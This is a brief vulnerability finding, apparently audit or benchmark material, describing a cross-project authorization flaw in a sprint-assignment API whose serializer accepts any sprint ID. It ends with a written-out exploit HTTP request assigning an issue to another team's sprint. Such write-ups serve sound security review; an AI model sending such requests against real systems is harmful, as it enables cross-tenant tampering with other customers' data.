diagnosis: When assign_sprint is called, the serializer uses SprintSchedule.objects.all() for sprint_id validation. While the issue is verified to belong to the user's project, the sprint can belong to an entirely different customer or team, allowing cross-project issue assignment and schedule corruption.
exploit_request:
POST /api/issues/4091/assign-sprint/ HTTP/1.1
Host: agile.pmcloud.io
Authorization: Bearer <dev_jwt>
Content-Type: application/json

{"sprint_id": 7702}
